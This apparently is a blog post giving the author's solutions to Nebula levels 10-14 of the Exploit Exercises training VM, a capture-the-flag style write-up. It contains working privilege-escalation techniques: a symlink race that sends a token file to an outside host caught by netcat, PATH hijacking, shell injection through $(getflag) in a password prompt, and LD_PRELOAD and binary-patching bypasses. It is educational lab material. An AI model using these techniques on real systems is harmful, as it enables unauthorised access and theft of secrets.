@@ -1,0 +1,451 @@
+
+<!DOCTYPE HTML>
+<html>
+<head>
+	<meta charset="utf-8">
+	<title>Nebula Shell Exploits (Solutions 10-14) - Louis Li</title>
+	<meta name="author" content="Louis Li">
+
+	
+	<meta name="description" content="Nebula Shell Exploits (Solutions 10-14) Overview This is the second post for my solutions of Exploit Exercises Level 10 Description (full): Read a &hellip;">
+	
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+	<link href="http://feeds.feedburner.com/louisligithub" rel="alternate" title="Louis Li" type="application/atom+xml">
+	
+	<link rel="canonical" href="http://louisrli.github.io/blog/2012/06/28/nebula1/">
+	<link href="/favicon.png" rel="shortcut icon">
+	<link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+	<!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+	<script src="//ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js"></script>
+	<link href='http://fonts.googleapis.com/css?family=Open+Sans:400italic,400,700' rel='stylesheet' type='text/css'>
+	<!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="http://fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="http://fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+</head>
+
+
+<body>
+	<div class="container">
+		<div class="left-col">
+			<div class="intrude-less">
+			<header id="header" class="inner"><div class="profilepic">
+	<script src="/javascripts/md5.js"></script>
+	<script type="text/javascript">
+		$(function(){
+			$('.profilepic').append("<img src='http://www.gravatar.com/avatar/" + MD5("louisrli@gmail.com") + "?s=160' alt='Profile Picture' style='width: 160px;' />");
+		});
+	</script>
+</div>
+<hgroup>
+  <h1><a href="/">Louis Li</a></h1>
+  
+</hgroup>
+
+<p class="subtitle"></p>
+<nav id="main-nav"><ul class="main-navigation">
+  <li><a href="/blog">Blog</a></li>
+  <li><a href="/blog/2013/01/12/sideprojects-2012/">Sideprojects</a></li>
+  <li><a href="http://github.com/louisrli">Github</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+</ul>
+
+</nav>
+<nav id="sub-nav">
+	<div class="social">
+		
+		
+		<a class="google" href="https://plus.google.com/106125247318074050350" rel="author" title="Google+">Google+</a>
+		
+		
+		
+		<a class="github" href="https://github.com/louisrli" title="GitHub">GitHub</a>
+		
+		
+		
+		
+		
+		
+		
+		
+		<a class="rss" href="http://feeds.feedburner.com/louisligithub" title="RSS">RSS</a>
+		
+	</div>
+</nav>
+</header>				
+			</div>
+		</div>	
+		<div class="mid-col">
+			
+				
+			
+			<div class="mid-col-container">
+				<div id="content" class="inner"><article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+	<h1 class="title" itemprop="name">Nebula Shell Exploits (Solutions 10-14)</h1>
+	<div class="entry-content" itemprop="articleBody"><h1>Overview</h1>
+
+<p>This is the second post for my solutions of <a href="http://exploit-exercises.com/nebula">Exploit Exercises</a></p>
+
+<h2>Level 10</h2>
+
+<p><strong>Description</strong> <a href="http://exploit-exercises.com/nebula/level10">(full)</a>: Read a token file with the password to the target account. A suid program uses <code>access()</code> to upload a file to a host.</p>
+
+<p>According to <a href="http://linux.die.net/man/2/access">man access()</a>, there&rsquo;s a race condition with this usage of the function:</p>
+
+<div>
+  <pre><code class='console'>man access
+Warning: Using access() to check if a user is authorized to, for example, open a file before actually doing so
+using open(2) creates a security hole, because the user might exploit the short time interval between
+checking and opening the file to manipulate it. For this reason, the use of this system call should be
+avoided. (In the example just described, a safer alternative would be to temporarily switch the process's
+effective user ID to the real ID and then call open(2).)</code></pre>
+</div>
+
+
+
+
+<!-- more -->
+
+
+<div>
+  <pre><code class='bash'>#!/bin/bash -x
+ # upload_file.sh
+rm ~/foo
+for i in `seq 10000`; do echo &quot;placeholder&quot; &gt;&gt; ~/foo; done
+/home/flag10/flag10 ~/foo 192.168.1.6
+sleep 0.0001
+rm ~/foo; ln -s /home/flag10/token ~/foo</code></pre>
+</div>
+
+
+<p>Now, we can run this script repeatedly:</p>
+
+<div>
+  <pre><code class='bash'>while true; do ./upload_file.sh; done</code></pre>
+</div>
+
+
+<p>On our local machine (Linux or Mac), we also listen at intervals with <code>netcat</code>:</p>
+
+<div>
+  <pre><code class='console'>localmachine$ while true; do sleep 1; nc -l 18211 | grep -v &quot;placeholder&quot;; done
+.oO Oo.
+.oO Oo.
+plac
+.oO Oo.
+.oO Oo.
+.oO Oo.
+plac
+.oO Oo.
+plac
+.oO Oo.
+plac
+.oO Oo.
+615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
+.oO Oo.
+.oO Oo.</code></pre>
+</div>
+
+
+<p>On the virtual machine:</p>
+
+<div>
+  <pre><code class='console'>$ su flag10
+Password:
+sh-4.2$ getflag</code></pre>
+</div>
+
+
+<h2>Level 11</h2>
+
+<p><strong>Description</strong> <a href="http://exploit-exercises.com/nebula/level11">(full)</a>: Execute <code>getflag</code> with the given source code.</p>
+
+<div>
+  <pre><code class='console'>$ cd ~
+$ echo &quot;Content-Length: 1\n\c&quot; &gt; ./foo
+$ echo &quot;getflag; whoami&quot; &gt; ./b
+$ export PATH=~:$PATH
+$ /home/flag11/flag11 &lt; ~/foo
+sh: $'b\200\263': command not found
+$ /home/flag11/flag11 &lt; ~/foo
+sh: $'b\300\241': command not found
+$ /home/flag11/flag11 &lt; ~/foo
+You have successfully executed getflag on a target account
+flag11</code></pre>
+</div>
+
+
+<p>This solution should be examined with the source code <a href="https://gist.github.com/1c924088f3df2ea27e6f#file_level11.c">(gist)</a>.</p>
+
+<p>This level was <em>great</em>.  These are the realizations that lead to a solution:</p>
+
+<ul>
+<li>The solution path must end with the <code>system()</code> call in <code>process()</code>.</li>
+<li>There are two ways to reach <code>process()</code> via the if-else branch in <code>main()</code>.</li>
+<li>The <code>else</code> branch is <em>extremely</em> random. It uses <code>mmap(NULL…)</code> (maps to a random memory address), <code>getrand()</code> (returns a random file descriptor), and XOR encryption.</li>
+<li>The <code>if</code> branch is <code>if (fread(buf, length, 1, stdin) != length)</code>. The third argument to <code>fread</code> is the number of members to read. The return value is the number of members read.</li>
+<li>Things just got a lot simpler, since <code>length</code> must be 1.</li>
+<li><code>process()</code> uses basic XOR encryption with the caveat that the key changes for each letter in the buffer. The buffer only has one letter, and <code>key = 1 &amp; 0xff</code>, which flips the last bit.</li>
+<li>Looking at the <a href="http://ascii-table.com">ASCII table</a>, if we want the final buffer to contain <code>b</code> (<code>01100010</code>), the key needs to be applied to <code>01100011</code> (<code>c</code>).</li>
+<li>Add an executable named <code>b</code> to the path, and let the program execute it until the buffer, by chance, ends with the string-terminating null byte.</li>
+</ul>
+
+
+<p>While walking to work, I laughed (in advance) thinking that the problem would have a deceivingly simple solution &mdash; and it did.</p>
+
+<h2>Level 12</h2>
+
+<p><strong>Description</strong> <a href="http://exploit-exercises.com/nebula/level12">(full)</a>: Access the flag account through a Lua script that seems to send the token with a certan SHA1 checksum.</p>
+
+<div>
+  <pre><code class='console'>$ nc 127.0.0.1 50001
+Password: $(getflag), which is $(whoami) &gt; ~/getflag.log
+Better luck next time
+$ cat /home/flag12/getflag.log
+You have successfully executed getflag on a target account, which is flag12</code></pre>
+</div>
+
+
+<p>According to the Internet, SHA1 checksums are, for all practical purposes, irreversible. This means that the solution path probably <em>doesn&rsquo;t</em> require us to find the unhashed input.</p>
+
+<p>This turns out to be the case. We execute arbitrary code via this line, where our input is the variable <code>..password..</code>:</p>
+
+<div>
+  <pre><code class='console'>prog = io.popen(&quot;echo &quot;..password..&quot; | sha1sum&quot;, &quot;r&quot;)</code></pre>
+</div>
+
+
+<h2>Level 13</h2>
+
+<p><strong>Description</strong> <a href="http://exploit-exercises.com/nebula/level13">(full)</a>: A program returns the token if the real uid is equal to <code>FAKEUID</code>, defined by a preprocessor macro.</p>
+
+<p>Given the source code, there seem to be two points of vulnerability for the program.
+1. The call to <code>getuid()</code>: can we substitute our own version of the function?
+2. The preprocessor macro for <code>FAKEUID</code>: can we redefine <code>FAKEUID</code>?</p>
+
+<h3>Overriding <code>getuid()</code></h3>
+
+<p>We link a shared library with our own function definition of <code>getuid()</code>, adding it through the <code>LD_PRELOAD</code> environmental variable. Because <code>suid</code> programs ignore <code>LD_PRELOAD</code>, we copy the binary to our own directory and modify the permissions.</p>
+
+<div>
+  <pre><code class='c'>// custom_uid.c
+#include systypes.h
+
+uid_t getuid()
+{
+    return 1000;
+}</code></pre>
+</div>
+
+
+
+
+<div>
+  <pre><code class='console'>$ # Create a shared library
+$ cd ~
+$ gcc -fPIC -g -c custom_uid.c
+$ gcc -shared -W1,-soname,uid.so -o uid.so custom_uid.o -lc
+$ ls *.so
+uid.so</code></pre>
+</div>
+
+
+
+
+<div>
+  <pre><code class='console'>$ # Preload the shared library
+$ export LD_PRELOAD=./uid.so
+$ cp /home/flag13/flag13 ~
+$ ldd flag13 | grep uid.so
+./uid.so (0x001c3000)
+$ chmod a+x ~/flag13
+$ ~/flag13
+your token is b705702b-76a8-42b0-8844-3adabbe5ac58
+$ su flag13
+sh-4.2$ getflag
+You have successfully executed getflag on a target account</code></pre>
+</div>
+
+
+<p>I wasn&rsquo;t familiar with these shared library vulnerabilities before these levels. To cite my sources, here are posts that I found during my search for &ldquo;overriding functions&rdquo;:</p>
+
+<ul>
+<li><a href="http://stackoverflow.com/a/618059/892168">Overriding functions in C</a>, Stack Overflow.</li>
+<li><a href="http://www.cis.syr.edu/~wedu/Teaching/cis643/LectureNotes_New/Set_UID.pdf">Course notes for suid exploits</a>, Syracuse University</li>
+</ul>
+
+
+<h3>Redefining <code>fakeuid</code></h3>
+
+<p>Unfortunately, it turns out that we can&rsquo;t quite &ldquo;redefine&rdquo; the preprocessor macro, since the binary is compiled without any debug flags from <code>gcc</code>.</p>
+
+<p><code>FAKEUID</code> is defined by 1000 (hex: <code>0x03e8</code>). We can take a look at the assembly using <code>objdump</code>.</p>
+
+<div>
+  <pre><code class='console'>$ echo $UID
+1014
+$ printf '%x\n' 1014 # Our uid in hex
+3f6
+$ printf '%x\n' 1000 # FAKEUID in hex
+3e8
+$ objdump -d flag13 | grep 3e8
+80484f4:        3d e8 03 00 00      cmp     __$0x3e8__,%eax
+…
+$ cp /home/flag13/flag13 ~
+$ vim ~/flag13
+$ # … Make the substitution described below #</code></pre>
+</div>
+
+
+<p>Our magic number is represented by <code>3d e8</code> because of the <a href="http://en.wikipedia.org/wiki/Little_endian#Little-endian">little-endian architecture</a>. Our goal is to change <code>0x3e8</code> to <code>0x3f6</code>, which is 1014 in binary.</p>
+
+<p>vim can be used to <a href="http://stackoverflow.com/a/839549/892168">edit binary files</a>. (I&rsquo;m an emacs user, but vim comes with the VM). We change <code>3de8</code> to <code>3df6</code> in the binary.</p>
+
+<div>
+  <pre><code class='console'>$ ~/flag13
+your token is b705702b-76a8-42b0-8844-3adabbe5ac58</code></pre>
+</div>
+
+
+<h2>Level 14</h2>
+
+<p><strong>Description</strong> <a href="http://exploit-exercises.com/nebula/level13">(full)</a>: <code>flag14 -e</code> encrypts stdin. A token file needs to be decrypted.</p>
+
+<div>
+  <pre><code class='bash'>#!/bin/bash
+# try.sh
+# A helper function for pattern finding
+try()
+{
+    echo &quot;$@&quot; | /home/flag14/flag14 -e; echo&quot;&quot;
+}</code></pre>
+</div>
+
+
+
+
+<div>
+  <pre><code class='console'>$ source ~/try.sh
+$ try 1; try @; try a
+1
+@
+a
+$ try 0231 # 0 - 0 = 0 | 3 - 2 = 1 | 5 - 3 = 2 |  4 - 1 = 3
+0354</code></pre>
+</div>
+
+
+<p>If we play around more, there seems to be a simple pattern: the encryption scheme increments each character by its index.</p>
+
+<div>
+  <pre><code class='c'>// decrypt.c
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+
+int main (int argc, char*argv[])
+{
+    for (int i = 0; i &lt; strlen(argv[1]); i++)
+        printf(&quot;%c&quot;, argv[1][i] - i);
+    printf(&quot;\n&quot;);
+}</code></pre>
+</div>
+
+
+
+
+<div>
+  <pre><code class='console'>$ gcc -std=c99 -o decrypt decrypt.c
+$ cat /home/flag14/token
+857:g67?5ABBo:BtDA?tIvLDKL{MQPSRQWW.
+$ ./decrypt $(cat /home/flag14/token)
+8457c118-887c-4e40-a5a6-33a25353165
+$ su flag14
+Password:
+sh4.2$ getflag
+You have successfully executed getflag on a target account</code></pre>
+</div>
+
+
+
+</div>
+
+</article>
+
+	<div class="share">
+	<div class="addthis_toolbox addthis_default_style ">
+	
+	
+	<a class="addthis_button_tweet"></a>
+	
+	
+	<a class="addthis_counter addthis_pill_style"></a>
+	</div>
+  <script type="text/javascript" src="http://s7.addthis.com/js/250/addthis_widget.js#pubid="></script>
+</div>
+
+
+
+<section id="comment">
+    <h1 class="title">Comments</h1>
+    <div id="disqus_thread" aria-live="polite"><noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+</section>
+</div>
+			</div>
+			<footer id="footer" class="inner"><p>
+  Copyright &copy; 2013 - Louis Li -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+Design credit: <a href="http://shashankmehta.in/archive/2012/greyshade.html">Shashank Mehta</a></footer>
+			<script src="/javascripts/slash.js"></script>
+<script src="/javascripts/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+	$('.fancybox').fancybox();
+})(jQuery);
+</script> <!-- Delete or comment this line to disable Fancybox -->
+
+
+<script type="text/javascript">
+      var disqus_shortname = 'louisrli';
+      
+        
+        // var disqus_developer = 1;
+        var disqus_identifier = 'http://louisrli.github.io/blog/2012/06/28/nebula1/';
+        var disqus_url = 'http://louisrli.github.io/blog/2012/06/28/nebula1/';
+        var disqus_script = 'embed.js';
+      
+    (function () {
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      dsq.src = 'http://' + disqus_shortname + '.disqus.com/' + disqus_script;
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    }());
+</script>
+
+
+
+	<script type="text/javascript">
+		var _gaq = _gaq || [];
+		_gaq.push(['_setAccount', 'UA-32823730-1']);
+		_gaq.push(['_trackPageview']);
+
+		(function() {
+			var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+			ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+			var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+		})();
+	</script>
+
+
+
+
+		</div>
+	</div>
+</body>
+</html>
